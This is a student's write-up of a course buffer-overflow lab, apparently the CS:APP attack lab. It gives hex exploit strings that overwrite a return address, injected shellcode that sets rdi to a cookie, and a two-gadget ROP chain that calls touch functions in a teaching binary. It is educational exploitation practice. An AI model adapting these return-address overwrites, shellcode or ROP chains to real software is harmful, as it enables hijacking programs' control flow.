# Phase 1

1.txt:
``` 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
a6 1c 40 00 00 00 00 00

```
> 0000000000401ca6 \<touch1>:

fill in the buffer area with random number first then place the address of touch1 at the end to overwrite the orignal return address.

# Phase 2
2.txt:

```
48 c7 c7 38 33 4f 2a 68 
da 1c 40 00 c3 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
48 1e 68 55 00 00 00 00
```
> cookie: 0x2a4f3338

> 0000000000401cda \<touch2>:

we write the code to be injected into a file first and then translate it to machine code, and then inject it into the starting point of buffer area, 
change the return address (in the same way we did in phase 1) to the address where we place the machine code (the starting point buffer area)


code to be injected:
2.d:
```
2.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 38 33 4f 2a 	mov    $0x2a4f3338,%rdi
   7:	68 da 1c 40 00       	pushq  $0x401cda
   c:	c3                   	retq   
```
 **what we did here:** we first move the cookie to the rdi register and pass it (as the first argument) to 
 the function of touch2 (by pushing it's address to the stack so when it return, it pops out the address and execute it.)

# Phase 3

3.txt:
```
48 c7 c7 78 1e 68 55 68 
ff 1d 40 00 c3 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
48 1e 68 55 00 00 00 00    
32 61 34 66 33 33 33 38
```
>0000000000401dff \<touch3>:

It is basically the same logic as phase 2, what's different is that it needs to 
convert the cookie into ascii code ( mine is `32 61 34 66 33 33 33 38` ) first, 
and it needs to place the cookie above the return address of getbuf, I place it in the frame of <test> here. 
We need to find the locations by checking the rsp of each breakpoints (the rsp status after getbuf is executed, 
and after it enters test frame...) to find the optimal position to place the code.

# Phase 4
In this phase you simply need to search for the required code by `ctrl + F` inside the document

4.txt:
```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
b4 1e 40 00 00 00 00 00 
38 33 4f 2a 00 00 00 00
df 1e 40 00 00 00 00 00
da 1c 40 00 00 00 00 00
```
> 0000000000401cda \<touch2>:

required code:

```
  401eb2:	8d 87 58 90 90 c3    	lea    -0x3c6f6fa8(%rdi),%eax
required code -> 401eb4 (gadget 1)

  401edd:	b8 48 89 c7 c3       	mov    $0xc3c78948,%eax
required code: -> 401edf  (gadget 2)

```

> pop : (58) appending a return command (c3) !!!

> mov %rax %rdi : (48 89 c7)

we simple pass the cookie before the slot which will do "popping", and then the command move the "popped" cookie from the stack and pass it to the rax register, move it to the rdi register, and then we call the touch2 function with the cookie as the argument by returning to the corresponding address 

# Conclusion

Glad that I've learnt some skills that will probably never be used in the future.
